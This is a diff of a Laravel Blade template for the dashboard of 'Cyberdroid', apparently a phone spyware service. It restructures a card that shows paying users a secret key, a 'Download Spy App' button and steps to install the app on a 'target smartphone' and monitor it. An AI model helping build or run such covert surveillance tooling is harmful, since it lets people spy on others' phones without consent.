@@ -189,19 +189,19 @@
                     </div>
                 </div>
             @else
-                <div class="tab-pane fade active show" id="payments" role="tabpanel">
-                    <div class="card card-success">
-                        <div class="card-header">
-                            <h3 class="card-title">Cyberdroid key</h3>
-                        </div>
-                        <div class="card-body">
-                            @if(\Illuminate\Support\Facades\Auth::user()->is_payment_confirmed == 1)
+                @if(\Illuminate\Support\Facades\Auth::user()->is_payment_confirmed == 1)
+                    <div class="tab-pane fade active show" id="payments" role="tabpanel">
+                        <div class="card card-success">
+                            <div class="card-header">
+                                <h3 class="card-title">Cyberdroid key</h3>
+                            </div>
+                            <div class="card-body">
+
                                 <h5>Your secret <strong>cyberdroid key</strong> is:
                                     <span class="badge badge-success">{{ \Illuminate\Support\Facades\Auth::user()->spy_key }}</span><br>
                                     @if(\Illuminate\Support\Facades\Auth::user()->downloaded == 1)
-                                        Here are the list of steps to follow:
+                                        Here are the list of steps to follow after downloading the app:
                                         <ol>
-                                            <li>Download the app by clicking the button below</li>
                                             <li>Install the app in the target smartphone</li>
                                             <li>Enter the cyberdroid key(You will be asked to enter the cyberdroid key before the app can launch).</li>
                                             <li>Start monitoring the cyberdroid activities here in the system</li>
@@ -214,11 +214,11 @@
                                         <button type="submit" onclick="load_page()" class="mt-3 btn btn-secondary">Download Spy App</button>
                                     </form>
                                 @endif
-                            @endif
+                                @endif
+                            </div>
                         </div>
                     </div>
-                </div>
-            @endif
+                @endif
         </div>
     </div>
 @endsection
